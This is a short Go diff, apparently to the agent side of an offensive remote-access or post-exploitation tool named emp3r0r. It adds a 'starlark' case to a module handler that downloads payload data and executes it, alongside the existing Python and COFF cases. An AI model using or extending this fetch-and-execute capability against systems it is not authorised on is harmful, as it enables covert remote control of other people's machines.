@@ -13,6 +13,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
+	"github.com/jm33-m0/emp3r0r/core/lib/script"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -51,6 +52,12 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 		out, err := agentutils.ExecutePython(payload_data, invocation.Argv, nil)
 		if err != nil {
 			return logging.Sprintf("running python script: %s (%v)", out, err)
+		}
+		return out
+	case "starlark":
+		out, err := script.Run(payload_data, invocation.Argv, nil)
+		if err != nil {
+			return logging.Sprintf("running starlark module: %v", err)
 		}
 		return out
 	case "coff":
